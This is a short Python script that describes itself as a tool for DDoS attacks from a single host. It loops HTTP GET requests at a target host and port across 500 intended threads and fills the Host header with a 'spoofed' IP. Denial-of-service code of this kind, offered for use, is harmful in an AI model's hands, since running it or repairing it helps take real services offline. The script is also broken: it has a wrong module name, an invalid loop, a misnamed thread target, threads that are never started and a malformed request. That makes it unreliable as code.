'''
Python script for performing DDoS attacks from a single host
'''

# Import needed modules.

import threading
import sockets

target_host = <target name>
target_port = <port #>
spoofed_ip = <spoofed_ip>

# Create socket object.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

'''
Define function for DDoS and establish while Loop to maintain connection.
'''

def ddos():
  while True():
    s.connect((target_host, target_port))
    s.sendto(('GET /' + target_host + ' HTTP 1.1/\r\n').encode('ascii'), (target_host, target_port))
    s.sendto(('Host: ' + spoofed_ip + ' \n\r\n\r').encode('ascii'), (target_host, target_port))
    s.close()
    
for i in range(500):
  thread = threading.thread(target=attack)
    
